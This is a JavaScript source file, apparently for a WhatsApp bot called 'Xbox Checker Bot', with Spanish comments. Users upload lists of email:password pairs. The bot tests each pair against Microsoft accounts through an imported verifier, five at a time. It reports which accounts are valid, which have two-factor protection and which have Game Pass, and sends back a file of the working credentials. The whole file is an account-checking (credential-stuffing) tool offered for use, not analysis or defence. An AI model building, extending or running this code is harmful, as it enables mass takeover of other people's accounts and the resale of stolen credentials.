import pkg from 'whatsapp-web.js';
const { Client, LocalAuth, MessageMedia } = pkg;
import qrcode from 'qrcode-terminal';
import { verifyXboxAccount } from './xboxVerifier.js';
import pLimit from 'p-limit';
import fs from 'fs';
import path from 'path';

import express from 'express';
const app = express();
const port = process.env.PORT || 3000;
let lastQr = "";

const client = new Client({
    authStrategy: new LocalAuth(),
    puppeteer: {
        headless: true,
        args: [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--disable-accelerated-2d-canvas',
            '--no-first-run',
            '--no-zygote',
            '--single-process',
            '--disable-gpu'
        ]
    }
});

// Servidor web para ver el QR desde el móvil
app.get('/', (req, res) => {
    if (lastQr) {
        res.send(`
            <html>
                <body style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;font-family:sans-serif;">
                    <h1>Escanea el QR para activar el Bot</h1>
                    <img src="https://api.qrserver.com/v1/create-qr-code/?data=${encodeURIComponent(lastQr)}&size=300x300" />
                    <p>Actualiza la página si el código expira.</p>
                </body>
            </html>
        `);
    } else {
        res.send('<h1>El bot ya está conectado o el QR se está generando...</h1>');
    }
});

app.listen(port, () => {
    console.log(`Servidor web activo en el puerto ${port}`);
});

// Límite de concurrencia para no saturar la API de Microsoft (ej: 5 cuentas a la vez)
const limit = pLimit(5);

client.on('qr', (qr) => {
    lastQr = qr;
    console.log('Nuevo código QR generado. Míralo en el navegador.');
    qrcode.generate(qr, { small: true });
});

client.on('ready', () => {
    lastQr = "";
    console.log('¡Bot de WhatsApp listo!');
});

client.on('message', async (msg) => {
    // Comando de ayuda
    if (msg.body.toLowerCase() === '!ayuda' || msg.body.toLowerCase() === '/start') {
        await msg.reply(
            '🎮 *Xbox Checker Bot* 🎮\n\n' +
            'Envíame un archivo `.txt` con el formato `email:contraseña` (uno por línea) para empezar a verificar.\n\n' +
            '*Comandos disponibles:*\n' +
            '• Envía el archivo .txt\n' +
            '• !ayuda - Muestra este mensaje'
        );
        return;
    }

    // Verificar si es un archivo adjunto
    if (msg.hasMedia && msg.type === 'document') {
        const media = await msg.downloadMedia();
        
        if (media.mimetype !== 'text/plain') {
            await msg.reply('❌ Por favor, envía un archivo de texto (.txt).');
            return;
        }

        const content = Buffer.from(media.data, 'base64').toString('utf-8');
        const lines = content.split(/\r?\n/).filter(line => line.includes(':'));

        if (lines.length === 0) {
            await msg.reply('❌ El archivo no contiene cuentas en formato `email:contraseña`.');
            return;
        }

        await msg.reply(`⏳ Procesando *${lines.length}* cuentas. Por favor, espera...`);

        const results = {
            valid: [],
            invalid: [],
            mfa: [],
            gamepass: []
        };

        const startTime = Date.now();

        // Procesar cuentas con límite de concurrencia
        const promises = lines.map(line => {
            const [email, password] = line.split(':').map(s => s.trim());
            return limit(async () => {
                const result = await verifyXboxAccount(email, password);
                if (result.status === 'valid') {
                    results.valid.push(result);
                    if (result.hasGamePass) {
                        results.gamepass.push(result);
                    }
                } else if (result.status === 'mfa') {
                    results.mfa.push(result);
                } else {
                    results.invalid.push(result);
                }
            });
        });

        await Promise.all(promises);

        const endTime = Date.now();
        const duration = ((endTime - startTime) / 1000).toFixed(1);

        // Crear resumen
        const summary = 
            `📊 *Resultados del Checkeo* 📊\n\n` +
            `✅ Válidas: ${results.valid.length}\n` +
            `🎮 Con Game Pass: ${results.gamepass.length}\n` +
            `❌ Inválidas: ${results.invalid.length}\n` +
            `🔐 Con 2FA (MFA): ${results.mfa.length}\n` +
            `⏱ Tiempo: ${duration}s\n\n` +
            `¿Cómo quieres recibir los detalles?\n` +
            `1. Resumen por chat\n` +
            `2. Archivo .txt con válidas\n` +
            `3. Ambas`;

        await msg.reply(summary);

        // Guardar resultados temporalmente para que el usuario elija
        // En una implementación real usaríamos una base de datos o sesión
        // Para este ejemplo, enviamos todo de una vez por simplicidad o esperamos respuesta
        
        // Vamos a preparar los archivos por si acaso
        const validFileContent = results.valid.map(r => `${r.email}:${r.gamePassType}`).join('\n');
        const fileName = `resultados_${Date.now()}.txt`;
        fs.writeFileSync(fileName, validFileContent);

        // Opción: El bot puede preguntar, pero para hacerlo fluido, enviamos el archivo de "Válidas" si son muchas
        if (results.valid.length > 0) {
            const mediaResult = MessageMedia.fromFilePath(fileName);
            await client.sendMessage(msg.from, mediaResult, { caption: 'Aquí tienes la lista de cuentas válidas detectadas.' });
        }

        // Limpiar archivo temporal
        setTimeout(() => {
            if (fs.existsSync(fileName)) fs.unlinkSync(fileName);
        }, 60000);
    }
});

client.initialize();
